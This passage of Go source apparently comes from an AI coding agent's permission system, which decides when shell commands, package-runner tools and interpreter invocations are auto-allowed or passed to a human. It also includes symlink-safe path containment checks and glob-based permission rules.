		URL      string `json:"url"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return ""
	}
	switch toolName {
	case "read", "write", "delete", "edit", "multiedit", "multi_file_edit", "replace_lines", "format", "lsp", "apply_patch", "grep", "repo_overview":
		if params.Path != "" {
			return params.Path
		}
		return params.FilePath
	case "glob", "list":
		if params.Pattern != "" {
			return params.Pattern
		}
		return params.Path
	case "webfetch":
		return params.URL
	default:
		return ""
	}
}

// shimUnderWorkDir reports whether shim resolves inside workDir after
// following symlinks. An existing shim (file or symlink) is resolved fully;
// a missing shim resolves its nearest existing ancestor and then verifies
// that no intermediate component is a symlink escaping workDir. This closes
// the hole where project `node_modules` is itself a symlink pointing outside
// the worktree — lexical containment (resolvePath + pathUnderRoot) would
// wrongly pass that.
func shimUnderWorkDir(shim, workDir string) bool {
	workCanon, err := filepath.EvalSymlinks(workDir)
	if err != nil {
		workCanon = filepath.Clean(workDir)
	}
	if canon, err := filepath.EvalSymlinks(shim); err == nil {
		return pathUnderRoot(canon, workCanon)
	}
	cur := shim
	var comps []string
	for {
		if _, err := os.Lstat(cur); err == nil {
			break
		}
		parent := filepath.Dir(cur)
		if parent == cur {
			return false
		}
		comps = append([]string{filepath.Base(cur)}, comps...)
		cur = parent
	}
	baseCanon, err := filepath.EvalSymlinks(cur)
	if err != nil || !pathUnderRoot(baseCanon, workCanon) {
		return false
	}
	for _, c := range comps {
		cur = filepath.Join(cur, c)
		if st, err := os.Lstat(cur); err == nil && st.Mode()&os.ModeSymlink != 0 {
			t, err := filepath.EvalSymlinks(cur)
			if err != nil || !pathUnderRoot(t, workCanon) {
				return false
			}
		}
	}
	return true
}

// nodeModulesBinTool normalizes a project-local package-bin invocation to its
// tool basename (e.g. `./node_modules/.bin/tsc` → `tsc`), or "" when the
// first word is not an in-project node_modules/.bin shim. Containment is
// canonical (see shimUnderWorkDir) and empty workDir fails closed, so a
// similarly-named shim outside the project (or with no project to check
// against) never auto-allows.
func nodeModulesBinTool(fields []string, workDir string) string {
	if len(fields) == 0 || workDir == "" {
		return ""
	}
	slash := strings.ReplaceAll(fields[0], "\\", "/")
	if !strings.Contains(slash, "node_modules/.bin/") {
		return ""
	}
	if !shimUnderWorkDir(resolvePath(fields[0], workDir), filepath.Clean(workDir)) {
		return ""
	}
	return filepath.Base(slash)
}

// matchSubcommandAllow returns true when the command matches an entry in
// bashSubcommandAllow at the longest possible token length (3 → 2 → 1).
// For `git`, leading global wrappers like `-C`, `--no-pager`, etc. are
// transparently stripped so `git --no-pager log` correctly maps to
// `git log`. "-c" wrappers are NOT stripped — they are evaluated by the LLM
// (read-only underlying subcommand → ALLOW, dangerous keys → DENY) and must
// not be auto-allowed via the code allowlist.
func matchSubcommandAllow(command, workDir string) bool {
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return false
	}
	// Project-local package bins (`./node_modules/.bin/tsc`,
	// `web/node_modules/.bin/eslint`): reuse runnerSafeTools on the basename,
	// gated on workDir containment (see nodeModulesBinTool).
	if bin := nodeModulesBinTool(fields, workDir); bin != "" {
		return runnerSafeTools[bin]
	}
	// Package runner invoking an inert tool (e.g. `npx tsc`, `pnpm dlx prettier`).
	if runnerInvokedSafeTool(fields) {
		return true
	}
	// Any "-c" wrapper forces LLM evaluation, not code allowlist. This
	// satisfies "no whitelisting for git -c" — the LLM prompt knows a
	// read-only underlying subcommand is still read-only and will ALLOW it,
	// while dangerous keys are marked harmful via hasDangerousGitConfig.
	if fields[0] == "git" {
		for _, f := range fields {
			if f == "-c" || (len(f) > 2 && f[:2] == "-c") {
				return false
			}
		}
	}
	// Normalize `git` wrappers: `git -C /tmp --no-pager <sub> ...`
	// should match the subcommand-pinned allowlist as `git <sub>`.
	normalized := fields
	if fields[0] == "git" {
		if idx := gitSubcommandIndex(fields); idx != -1 {
			// Rebuild as ["git", subcommand, ...remaining args]
			n := make([]string, 0, len(fields)-idx+1)
			n = append(n, "git", fields[idx])
			n = append(n, fields[idx+1:]...)
			normalized = n
		}
	}
	// Three-word match (e.g. "docker compose ps").
	if len(normalized) >= 3 {
		key := normalized[0] + " " + normalized[1] + " " + normalized[2]
		if bashSubcommandAllow[key] {
			return true
		}
	}
	// Two-word match (e.g. "git status").
	if len(normalized) >= 2 {
		key := normalized[0] + " " + normalized[1]
		if bashSubcommandAllow[key] {
			// `bun run` / `vp run` guard: unlike `npm/pnpm/yarn run` (which
			// only execute a named package.json script), these also execute
			// an arbitrary file when given one. A path-like run target must
			// not auto-allow — drop to Ask so the interpreter verifier (or a
			// human) sees it.
			if (key == "bun run" || key == "vp run") && len(normalized) >= 3 && isPathLikeScript(normalized[2]) {
				return false
			}
			return true
		}
	}
	// `vpr` is standalone `vp run`: project tasks, same trust as `npm run` —
	// but a path-like target must not auto-allow (parity with the guard above).
	if normalized[0] == "vpr" && len(normalized) >= 2 && isPathLikeScript(normalized[1]) {
		return false
	}
	// Single-word match (e.g. "make", "tsc"). These accept any args.
	return bashSubcommandAllow[normalized[0]]
}

// runnerSafeTools are inert, project-trusted tools (type-checkers, linters,
// formatters, test runners) that are safe to auto-allow even when invoked
// through a package runner like `npx`/`bunx`/`pnpm dlx`. Same trust model as
// the bare-command entries in bashSubcommandAllow — the binary itself has no
// destructive effect; the runner only resolves/fetches the well-known package.
var runnerSafeTools = map[string]bool{
	"tsc":       true,
	"tsgo":      true,
	"eslint":    true,
	"prettier":  true,
	"biome":     true,
	"vitest":    true,
	"jest":      true,
	"stylelint": true,
}

// runnerBooleanFlags are valueless flags that may appear between a package
// runner and the tool name (e.g. `npx -y tsc`). They are skipped during tool
// resolution. Any OTHER dashed token (especially value-taking flags like
// `-p`/`--package`, which can point the runner at an arbitrary package) makes
// the command non-auto-allowable, so resolution fails closed.
var runnerBooleanFlags = map[string]bool{
	"-y": true, "--yes": true, "--no-install": true,
	"-q": true, "--quiet": true, "--silent": true,
	"--no": true, "--bun": true,
}

// runnerInvokedSafeTool reports whether command is a package runner invoking a
// tool in runnerSafeTools (e.g. `npx tsc --noEmit`, `pnpm dlx prettier .`,
// `bunx eslint`). It strips the runner prefix and any leading boolean flags,
// then checks the first non-flag token against runnerSafeTools. Unknown dashed
// flags between the runner and the tool fail closed (returns false) so a
// `--package`-style override can never smuggle in an arbitrary package.
func runnerInvokedSafeTool(fields []string) bool {
	if len(fields) == 0 {
		return false
	}
	idx := 0
	switch {
	case remoteRunners[fields[0]]: // npx, bunx, vpx
		idx = 1
	case len(fields) >= 2:
		two := fields[0] + " " + fields[1]
		switch two {
		case "pnpm dlx", "pnpm exec", "yarn dlx", "yarn exec", "bun x", "vp exec", "vp dlx":
			idx = 2
		}
	}
	if idx == 0 {
		return false
	}
	for ; idx < len(fields); idx++ {
		f := fields[idx]
		if strings.HasPrefix(f, "-") {
			if runnerBooleanFlags[f] {
				continue
			}
			return false // value-taking / unknown flag → fail closed
		}
		return runnerSafeTools[f]
	}
	return false
}

// isPathLikeScript reports whether a runner argument names a file path (rather
// than a manifest script name) — it contains a path separator, starts with ".",
// or has a known script extension.
func isPathLikeScript(arg string) bool {
	if strings.ContainsAny(arg, "/\\") || strings.HasPrefix(arg, ".") {
		return true
	}
	switch strings.ToLower(filepath.Ext(arg)) {
	case ".ts", ".js", ".mjs", ".cjs", ".tsx", ".jsx", ".mts", ".cts":
		return true
	}
	return false
}

// --- Interpreter-execution classification (2026-06-02 follow-up) -------------

// InterpreterExec describes a classified interpreter invocation (python file.py,
// python stdin redirection, a heredoc, an inline -e eval, or a remote runner like npx).
// It is produced deterministically in Go from the raw command; the LLM never
// decides classification, only effects.
type InterpreterExec struct {
	Language     string // python | ruby | javascript | perl
	Binary       string // python3, node, bun, npx, "pnpm dlx", ...
	SourceMode   string // heredoc | inline_eval | script_file | stdin_pipe | remote | unknown_source
	Entrypoint   string // resolved script path (script_file)
	EmbeddedBody string // heredoc / inline-eval source body
	Delimiter    string // heredoc delimiter
	Terminated   bool   // heredoc body was properly closed
	RemoteSpec   string // package spec for remote runners
	RawCommand   string
}

var interpreterLanguages = map[string]string{
	"python":  "python",
	"python3": "python",
	"python2": "python",
	"ruby":    "ruby",
	"node":    "javascript",
	"tsx":     "javascript",
	"bun":     "javascript",
	"deno":    "javascript",
	"perl":    "perl",
}

var remoteRunners = map[string]bool{
	"npx":  true,
	"bunx": true,
	"vpx":  true, // Vite+ package runner (`vpx tsc` ~ `npx tsc`)
}

// bunBuiltinSubcommands are `bun` subcommands that are NOT script-file
// executions. These are built-in commands (test runner, package manager,
// scaffolding, etc.) that don't run a specific script file as entrypoint.
// They fall through to the normal bash permission flow where the two-word
// prefix (e.g. "bun test") may be auto-allowed via bashSubcommandAllow.
// Only "bun run" is a script runner and is handled via the script_file path.
var bunBuiltinSubcommands = map[string]bool{
	"test":    true,
	"create":  true,
	"init":    true,
	"install": true,
	"add":     true,
	"remove":  true,
	"update":  true,
	"upgrade": true,
	"pm":      true,
	"plugin":  true,
	"tool":    true,
	"why":     true,
}

// denoBuiltinSubcommands are `deno` subcommands that are NOT script-file
// executions. Only "deno run" is a script runner and is handled via the
// script_file path.
var denoBuiltinSubcommands = map[string]bool{
	"test":        true,
	"compile":     true,
	"bundle":      true,
	"fmt":         true,
	"lint":        true,
	"doc":         true,
	"check":       true,
	"coverage":    true,
	"install":     true,
	"uninstall":   true,
	"cache":       true,
	"serve":       true,
	"task":        true,
	"completions": true,
	"info":        true,
	"jupyter":     true,
}

var heredocOpRe = regexp.MustCompile(`<<-?\s*(["']?)([A-Za-z_][A-Za-z0-9_]*)["']?`)

type heredocDoc struct {
	delim      string
	body       string
	quoted     bool
	terminated bool
}

// extractHeredocs scans a (possibly multi-line) command string for heredoc
// redirections (<<DELIM, <<-DELIM, <<'DELIM', <<"DELIM") and returns the command
// header with the heredoc operators removed plus the bodies in delimiter order.
// It is a bounded line-based pre-pass — not a full shell parser. Unterminated
// heredocs are returned with terminated=false so callers can fall back to Ask.
func extractHeredocs(command string) (header string, docs []heredocDoc) {
	lines := strings.Split(command, "\n")
	if len(lines) == 0 {
		return command, nil
	}
	type pending struct {
		delim     string
		quoted    bool
		stripTabs bool
	}
	// Find the first line carrying a heredoc operator — it need not be lines[0]
	// when the command starts with a leading `#` comment line.
	headerIdx := -1
	var pend []pending
	for i, line := range lines {
		matches := heredocOpRe.FindAllStringSubmatch(line, -1)
		if len(matches) == 0 {
			continue
		}
		headerIdx = i
		for _, m := range matches {
			pend = append(pend, pending{
				delim:     m[2],
				quoted:    m[1] != "",
				stripTabs: strings.HasPrefix(m[0], "<<-"),
			})
		}
		break
	}
	if headerIdx < 0 {
		// No heredoc operators: the line-split was only needed to collect
		// heredoc bodies. Return the full original command so multi-line
		// payloads (e.g. `python3 -c "<newline-laden body>"`) survive intact
		// instead of being truncated to their first line.
		return command, nil
	}
	header = strings.TrimSpace(heredocOpRe.ReplaceAllString(strings.Join(lines[:headerIdx+1], "\n"), ""))

	idx := headerIdx + 1
	for _, p := range pend {
		var body []string
		terminated := false
		for idx < len(lines) {
			line := lines[idx]
			idx++
			cmp := line
			if p.stripTabs {
				cmp = strings.TrimLeft(cmp, "\t")
			}
			if cmp == p.delim {
				terminated = true
				break
			}
			body = append(body, line)
		}
		docs = append(docs, heredocDoc{
			delim:      p.delim,
			body:       strings.Join(body, "\n"),
			quoted:     p.quoted,
			terminated: terminated,
		})
	}
	return header, docs
}

// hasModuleFlag reports whether args contains a "-m" flag, indicating a module
// invocation (e.g. python3 -m pytest) rather than a script file.
func hasModuleFlag(args []string) bool {
	for _, a := range args {
		if a == "-m" {
			return true
		}
	}
	return false
}

// firstNonFlagArg returns the first argument that is not a flag (does not start
// with "-"), or "" when none exists.
func firstNonFlagArg(args []string) string {
	for _, a := range args {
		if strings.HasPrefix(a, "-") {
			continue
		}
		return a
	}
	return ""
}

var inlineEvalFlags = map[string]bool{"-e": true, "--eval": true, "-c": true, "--command": true, "-p": true, "--print": true}

// inlineEvalCode extracts the inline source from an interpreter's eval flag
// (python -c, node/bun/deno -e/--eval, ruby/perl -e). Returns (code, true) when
// an eval flag is present, even if the code argument is missing.
func inlineEvalCode(args []string) (string, bool) {
	for i := 0; i < len(args); i++ {
		a := args[i]
		if inlineEvalFlags[a] {
			if i+1 < len(args) {
				return args[i+1], true
			}
			return "", true
		}
		// Joined short form, e.g. -e"code".
		for f := range inlineEvalFlags {
			if len(f) == 2 && len(a) > 2 && strings.HasPrefix(a, f) {
				return a[2:], true
			}
		}
	}
	return "", false
}

// classifyInterpreterExecution inspects a raw bash command and, when it is an
// interpreter invocation, returns a deterministic classification. It only
// classifies when the interpreter is the first command word (the common agent
// case); piped/embedded interpreters elsewhere fall through to the normal path.
func classifyInterpreterExecution(command string) (*InterpreterExec, bool) {
	header, docs := extractHeredocs(command)
	cmds, err := parseShellCommandLine(header)
	if err != nil || len(cmds) == 0 {
		return nil, false
	}
	words := cmds[0].cmdWords
	if len(words) == 0 {
		return nil, false
	}
	bin := filepath.Base(words[0]) // handle /usr/bin/python3
	args := words[1:]

	// Two-word remote runners: "pnpm dlx", "bun x".
	if len(words) >= 2 {
		two := bin + " " + words[1]
		if two == "pnpm dlx" || two == "bun x" {
			spec := ""
			if len(words) >= 3 {
				spec = firstNonFlagArg(words[2:])
			}
			return &InterpreterExec{Language: "javascript", Binary: two, SourceMode: "remote", RemoteSpec: spec, RawCommand: command}, true
		}
	}

	if remoteRunners[bin] {
		return &InterpreterExec{Language: "javascript", Binary: bin, SourceMode: "remote", RemoteSpec: firstNonFlagArg(args), RawCommand: command}, true
	}

	lang, ok := interpreterLanguages[bin]
	if !ok {
		return nil, false
	}
	ie := &InterpreterExec{Language: lang, Binary: bin, RawCommand: command}

	// Heredoc body attached.
	if len(docs) > 0 {
		var bodies []string
		terminated := true
		for _, d := range docs {
			bodies = append(bodies, d.body)
			if !d.terminated {
				terminated = false
			}
		}
		ie.SourceMode = "heredoc"
		ie.EmbeddedBody = strings.Join(bodies, "\n")
		ie.Delimiter = docs[0].delim
		ie.Terminated = terminated
		return ie, true
	}

	// Inline eval flag (node -e, python -c, ...).
	if code, found := inlineEvalCode(args); found {
		ie.SourceMode = "inline_eval"
		ie.EmbeddedBody = code
		ie.Terminated = true
		return ie, true
	}

	// `bun run x.ts` / `deno run x.ts` — the file follows the run subcommand.
	rest := args
	if (bin == "bun" || bin == "deno") && len(rest) > 0 && rest[0] == "run" {
		rest = rest[1:]
		// `bun run <name>` with a bare (non-path-like) argument executes a
		// package.json script (e.g. `bun run typecheck`), NOT a file on disk.
		// Treating it as a script_file makes the interpreter verifier try to
		// read a non-existent file and deny. Fall through to the normal bash
		// flow where the "bun run" two-word prefix can be auto-allowed.
		// Only a path-like argument (`bun run ./x.ts`) is a real script file.
		if bin == "bun" {
			if entry := firstNonFlagArg(rest); entry == "" || !isPathLikeScript(entry) {
				return nil, false
			}
		}
	}
	// Bun/Deno built-in subcommands (other than run) are not script file
	// executions. They are handled by the normal bash permission flow
	// where two-word prefixes (e.g. "bun test") can be auto-allowed via
	// bashSubcommandAllow, and the script is never misidentified as a
	// non-existent entrypoint named after the subcommand.
	if bin == "bun" && len(args) > 0 && bunBuiltinSubcommands[args[0]] {
		return nil, false
	}
	if bin == "deno" && len(args) > 0 && denoBuiltinSubcommands[args[0]] {
		return nil, false
	}

	// `-m module` runs a Python/Ruby/etc. module by name, not a script file on disk.
	// Skip script_file detection so we don't misidentify the module name as a path.
	if !hasModuleFlag(rest) {
		if entry := firstNonFlagArg(rest); entry != "" && entry != "-" {
			ie.SourceMode = "script_file"
			ie.Entrypoint = entry
			return ie, true
		}
	}

	if len(cmds[0].stdinRedirections) > 0 {
		if input := cmds[0].stdinRedirections[0]; input != "" && input != "-" && input != "/dev/stdin" {
			ie.SourceMode = "stdin_pipe"
			ie.Entrypoint = input
			return ie, true
		}
	}

	// Bare interpreter / REPL / `python -` stdin — no analyzable source.
	ie.SourceMode = "unknown_source"
	return ie, true
}

func extractDomainFromURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	hostname := parsed.Hostname()
	if hostname == "" {
		hostname = parsed.Host
	}
	return hostname
}

// isLocalhostDomain reports whether a hostname refers to the local machine
// (localhost, 127.x.x.x, ::1, or any [::1]-style bracket form).
func isLocalhostDomain(host string) bool {
	// Strip brackets from IPv6 literals.
	h := strings.TrimPrefix(strings.TrimSuffix(host, "]"), "[")
	switch h {
	case "localhost", "::1":
		return true
	}
	// 127.0.0.0/8 loopback range.
	if strings.HasPrefix(h, "127.") {
		return true
	}
	return false
}

// matchPathPattern matches a path against a glob pattern that may contain
// "**" (recursive wildcard, matches zero or more path segments) and "*"
// (single-segment wildcard, does not match "/"). Standard filepath.Match
// patterns like "?" are also supported.
func matchPathPattern(pattern, path string) bool {
	// Normalise to forward slashes, but do NOT filepath.Clean the pattern —
	// "**" is not a real filesystem element and Clean would interpret it as a
	// literal directory name.
	pattern = filepath.ToSlash(pattern)
	cleanPath := filepath.ToSlash(filepath.Clean(path))

	// Split into segments so we can handle "**" correctly.
	patSegs := strings.Split(pattern, "/")
	pathSegs := strings.Split(cleanPath, "/")

	return matchPathSegments(patSegs, pathSegs)
}

// matchPathSegments recursively matches path segments against pattern segments,
// supporting "**" as a recursive wildcard (matches zero or more segments).
func matchPathSegments(pattern, path []string) bool {
	// If both are empty, it's a match.
	if len(pattern) == 0 && len(path) == 0 {
		return true
	}

	// If pattern is empty but path isn't, no match.
	if len(pattern) == 0 {
		return false
	}

	// Handle "**" at current position
	if pattern[0] == "**" {
		// Try matching zero or more path segments against the rest of the pattern.
		// Try zero first, then one, two, etc.
		for i := 0; i <= len(path); i++ {
			if matchPathSegments(pattern[1:], path[i:]) {
				return true
			}
		}
		return false
	}

	// If path is empty but pattern isn't (and we didn't match ** above), no match.
	if len(path) == 0 {
		return false
	}

	// Match current segment with filepath.Match (handles *, ?, [a-z], etc.)
	matched, err := filepath.Match(pattern[0], path[0])
	if err != nil || !matched {
		return false
	}

	// Recurse to the next segment
	return matchPathSegments(pattern[1:], path[1:])
}

func matchPattern(pattern, name string) bool {
	if pattern == "*" {
		return true
	}
	if !strings.Contains(pattern, "*") {
		return pattern == name
	}
	parts := strings.SplitN(pattern, "*", 2)
	if len(parts) == 2 {
		if parts[1] == "" {
			return strings.HasPrefix(name, parts[0])
		}
		if parts[0] == "" {
			return strings.HasSuffix(name, parts[1])
		}
		return strings.HasPrefix(name, parts[0]) && strings.HasSuffix(name, parts[1])
	}
	return false
}

func (pm *PermissionManager) SetRule(toolName string, level PermissionLevel) {
	if !validPermissionLevel(level) {
		return
	}
	// Never allow setting bash tool to allow — this would auto-approve all
	// bash commands, including harmful operations like git revert/stash.
	if toolName == "bash" && level == PermissionAllow {
		return
	}
	if strings.Contains(toolName, "*") {
		pm.patterns = append(pm.patterns, patternRule{pattern: toolName, level: level})
	} else {
		pm.rules[toolName] = level
	}
}

// SetUserConfirmedRule marks a tool rule as having been explicitly confirmed
// by the user (e.g. via "always allow this tool"). User-confirmed allows
// bypass the out-of-scope and sensitive-path gates so the user isn't
// prompted repeatedly for the same permitted tool. Default allow rules
// (from NewPermissionManager) do NOT set this flag.
func (pm *PermissionManager) SetUserConfirmedRule(toolName string, level PermissionLevel) {
	pm.SetRule(toolName, level)
	if level == PermissionAllow && !strings.Contains(toolName, "*") {
		pm.userConfirmedRules[toolName] = true
	}
}

// IsUserConfirmedRule returns true if the tool was explicitly allowed by the
// user (as opposed to a default allow rule). Used by Decide() to decide
// whether to bypass out-of-scope / sensitive-path gates.
func (pm *PermissionManager) IsUserConfirmedRule(toolName string) bool {
	return pm.userConfirmedRules[toolName]
}

func (pm *PermissionManager) SetPathRule(toolName, pattern string, level PermissionLevel) {
	if toolName == "" || pattern == "" || !validPermissionLevel(level) {
		return
	}
	pm.pathPatterns[toolName] = append(pm.pathPatterns[toolName], pathPatternEntry{pattern: pattern, level: level})
}

// CheckPathPatterns returns the first matching permission level from path-based
// rules for the given tool and target path, or empty string if no rule matches.
func (pm *PermissionManager) CheckPathPatterns(toolName, targetPath string) PermissionLevel {
	entries, ok := pm.pathPatterns[toolName]
	if !ok {
		return ""
	}
	for _, entry := range entries {
		if matchPathPattern(entry.pattern, targetPath) {
			return entry.level
		}
	}
	// Also check wildcard tool entries (e.g., "mcp_*" → matches any MCP tool)
	for pattern, entries := range pm.pathPatterns {
		if matchPattern(pattern, toolName) {
			for _, entry := range entries {
				if matchPathPattern(entry.pattern, targetPath) {
					return entry.level
				}
			}
		}
	}
	return ""
}

func (pm *PermissionManager) SetBashPrefixRule(prefix string, level PermissionLevel) {
	if prefix == "" || !validPermissionLevel(level) || strings.HasPrefix(prefix, bashInRootPersistPrefix) {
		return
	}
	// Reject always-allow for git prefix — this would auto-approve all git
	// subcommands, including harmful operations like revert, stash, etc.
	if prefix == "git" && level == PermissionAllow {
		return
	}
	pm.bashPrefixes[prefix] = level
}

func (pm *PermissionManager) BashAutoAllowPrefixes() []string {
	result := make([]string, 0, len(pm.bashAutoAllow))
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if v {
			result = append(result, k)
		}
	}
	return result
}

// ExtraBashAutoAllowPrefixes returns auto-allow prefixes that were granted
// beyond the built-in default set (e.g. via config or in-session "allow"),
// sorted for stable display. The built-in defaults are excluded because they
// are always allowed and only add noise to the sidebar.
func (pm *PermissionManager) ExtraBashAutoAllowPrefixes() []string {
	result := make([]string, 0)
	for k, v := range pm.bashAutoAllow {
		if !v {
			continue
		}
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if bashAutoAllowPrefixes[k] {
			continue // built-in default — already allowed
		}
		result = append(result, k)
	}
	sort.Strings(result)
	return result
}

func (pm *PermissionManager) SetBashAutoAllowPrefix(prefix string, enabled bool) {
	if strings.TrimSpace(prefix) == "" {
		return
	}
	if enabled {
		pm.bashAutoAllow[prefix] = true
		if _, ok := pm.bashPrefixModes[prefix]; !ok {
			pm.bashPrefixModes[prefix] = bashPrefixModeReadOnly
		}
		return
	}
	delete(pm.bashAutoAllow, prefix)
}

func (pm *PermissionManager) BashPrefixModes() map[string]string {
	result := make(map[string]string, len(pm.bashPrefixModes))
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		result[k] = v
	}
	return result
}

func (pm *PermissionManager) SetBashPrefixMode(prefix, mode string) bool {
	if strings.TrimSpace(prefix) == "" {
		return false
	}
	if mode != bashPrefixModeReadOnly && mode != bashPrefixModeMutating && mode != bashPrefixModeNever {
		return false
	}
	pm.bashPrefixModes[prefix] = mode
	if _, ok := pm.bashAutoAllow[prefix]; !ok && mode != bashPrefixModeNever {
		pm.bashAutoAllow[prefix] = true
	}
	return true
}

func (pm *PermissionManager) SetMode(mode PermissionMode) {
	switch mode {
	case PermissionModeNormal, PermissionModeYOLO, PermissionModeLocked, PermissionModeSandbox:
		pm.mode = mode
		if mode == PermissionModeYOLO {
			// YOLO is a hard bypass: it must not retain or re-enable the
			// LLM auto-permission layer.
			pm.autoPermissionEnabled = false
		}
	}
}

// SetAutoPermissionEnabled toggles the LLM auto-permission layer at runtime.
// YOLO mode is a hard bypass and cannot have auto-permission re-enabled while
// it is active.
func (pm *PermissionManager) SetAutoPermissionEnabled(enabled bool) {
	if pm == nil {
		return
	}
	if enabled && pm.mode == PermissionModeYOLO {
		return
	}
	pm.autoPermissionEnabled = enabled
}

// AutoPermissionEnabled reports whether the LLM auto-permission layer is
// currently engaged. Returns false when pm is nil.
func (pm *PermissionManager) AutoPermissionEnabled() bool {
	if pm == nil {
		return false
	}
	return pm.autoPermissionEnabled
}

// AddAutoGrant records a derived interpreter grant in the in-memory matcher set.
// The session layer is responsible for the durable save; this only keeps the
// live manager in sync so repeats within the session match without re-consulting
// the model.
func (pm *PermissionManager) AddAutoGrant(g config.AutoGrant) {
	if pm == nil {
		return
	}
	pm.autoGrants = append(pm.autoGrants, g)
}

// normalizeGrantCommand canonicalizes a shell command enough for exact grant
// matching: trim outer whitespace and collapse shell-token whitespace while
// preserving argument order.
func normalizeGrantCommand(command string) string {
	command = strings.TrimSpace(command)
	if command == "" {
		return ""
	}
	return strings.Join(splitShellFields(command), " ")
}

// resolvedInterpreterEntrypoint returns the absolute, symlink-resolved path for
// a classified interpreter execution's source file, or "" when no path can be
// resolved.
func resolvedInterpreterEntrypoint(ie *InterpreterExec, workDir string) string {
	if ie == nil || ie.Entrypoint == "" {
		return ""
	}
	full := ie.Entrypoint
	if !filepath.IsAbs(full) && workDir != "" {
		full = filepath.Join(workDir, full)
	}
	if resolved, err := filepath.EvalSymlinks(full); err == nil {
		full = resolved
	}
	return filepath.Clean(full)
}

// MatchInterpreterGrant reports whether a persisted exact grant authorizes this
// interpreter execution. Exact grants are keyed by language, source mode,
// normalized command, resolved entrypoint path, cwd, and source hash. sourceHash
// is the sha256 of the entrypoint file (script_file / stdin_pipe).
//
// allowDestructive reflects the current policy: destructive grants are only
// matched when the user has opted in to destructive auto-approval. This
// prevents a grant created under allow_destructive=true from silently
// bypassing a later allow_destructive=false policy.
func (pm *PermissionManager) MatchInterpreterGrant(ie *InterpreterExec, sourceHash string, allowDestructive bool) bool {
	if pm == nil || ie == nil || sourceHash == "" {
		return false
	}
	if ie.SourceMode == "heredoc" || ie.SourceMode == "inline_eval" {
		return false
	}
	normalizedCommand := normalizeGrantCommand(ie.RawCommand)
	cwd := pm.effectiveWorkDir()
	resolvedPath := resolvedInterpreterEntrypoint(ie, cwd)
	for _, g := range pm.autoGrants {
		if g.Kind != "interpreter_exact" || g.Language != ie.Language || g.SourceMode != ie.SourceMode {
			continue
		}
		if g.EntrypointSHA256 != sourceHash {
			continue
		}
		if g.NormalizedCommand != "" && g.NormalizedCommand != normalizedCommand {
			continue
		}
		if g.EntrypointPath != "" && g.EntrypointPath != resolvedPath {
			continue
		}
		if g.CWD != "" && g.CWD != cwd {
			continue
		}
		// Destructive grants require the current policy to permit destructive
		// auto-approval; otherwise fall through to human Ask.
		if g.Destructive && !allowDestructive {
			continue
		}
		return true
	}
	return false
}

func (pm *PermissionManager) SetWorkDir(path string) {
	pm.workDir = filepath.Clean(path)
	pm.LoadClaudePermissions(pm.workDir)
}

// effectiveWorkDir is the session working directory (SetWorkDir) or, when none
// was set, the process cwd. Desktop/web sessions never chdir the process, so
// anything cwd-relative in the permission path must go through this.
func (pm *PermissionManager) effectiveWorkDir() string {
	if pm.workDir != "" {
		return pm.workDir
	}
	return safeGetwd()
}

func (pm *PermissionManager) SetWebfetchDomain(domain string, level PermissionLevel) {
	if validPermissionLevel(level) {
		pm.webfetchDomains[domain] = level
	}
}

func (pm *PermissionManager) Mode() PermissionMode {
	if pm.mode == "" {
		return PermissionModeNormal
	}
	return pm.mode
}

func (pm *PermissionManager) Clone() *PermissionManager {
	if pm == nil {
		return nil
	}

	clone := &PermissionManager{
		mode:                  pm.Mode(),
		rules:                 make(map[string]PermissionLevel, len(pm.rules)),
		patterns:              append([]patternRule(nil), pm.patterns...),
		pathPatterns:          make(map[string][]pathPatternEntry, len(pm.pathPatterns)),
		bashPrefixes:          make(map[string]PermissionLevel, len(pm.bashPrefixes)),
		bashAutoAllow:         make(map[string]bool, len(pm.bashAutoAllow)),
		bashPrefixModes:       make(map[string]string, len(pm.bashPrefixModes)),
		workDir:               pm.workDir,
		webfetchDomains:       make(map[string]PermissionLevel, len(pm.webfetchDomains)),
		autoPermissionEnabled: pm.autoPermissionEnabled,
		autoGrants:            append([]config.AutoGrant(nil), pm.autoGrants...),
		claudeBashAllow:       append([]string(nil), pm.claudeBashAllow...),
		claudeBashDeny:        append([]string(nil), pm.claudeBashDeny...),
		claudeBashAsk:         append([]string(nil), pm.claudeBashAsk...),
	}
	for k, v := range pm.rules {
		clone.rules[k] = v
	}
	for k, v := range pm.bashPrefixes {
		clone.bashPrefixes[k] = v
	}
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		clone.bashAutoAllow[k] = v
	}
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		clone.bashPrefixModes[k] = v
	}
	for k, v := range pm.webfetchDomains {
		clone.webfetchDomains[k] = v
	}
	for toolName, entries := range pm.pathPatterns {
		clone.pathPatterns[toolName] = append([]pathPatternEntry(nil), entries...)
	}
	if pm.claudeBareDeny != nil {
		clone.claudeBareDeny = make(map[string]bool, len(pm.claudeBareDeny))
		for k, v := range pm.claudeBareDeny {
			clone.claudeBareDeny[k] = v
		}
	}
	if pm.claudeBareAsk != nil {
		clone.claudeBareAsk = make(map[string]bool, len(pm.claudeBareAsk))
		for k, v := range pm.claudeBareAsk {
			clone.claudeBareAsk[k] = v
		}
	}
	return clone
}

func (pm *PermissionManager) Rules() map[string]PermissionLevel {
	result := make(map[string]PermissionLevel)
	for k, v := range pm.rules {
		result[k] = v
	}
	for _, p := range pm.patterns {
		result[p.pattern] = p.level
	}
	return result
}

func (pm *PermissionManager) BashPrefixRules() map[string]PermissionLevel {
	result := make(map[string]PermissionLevel)
	for k, v := range pm.bashPrefixes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		result[k] = v
	}
	return result
}

func (pm *PermissionManager) matchBashPrefixRule(cmdWords []string, level PermissionLevel) (string, bool) {
	if len(cmdWords) == 0 {
		return "", false
	}
	keys := make([]string, 0, len(pm.bashPrefixes))
	for prefix, prefixLevel := range pm.bashPrefixes {
		if prefixLevel != level {
			continue
		}
		if strings.HasPrefix(prefix, bashInRootPersistPrefix) {
			continue
		}
		keys = append(keys, prefix)
	}
	sort.Slice(keys, func(i, j int) bool {
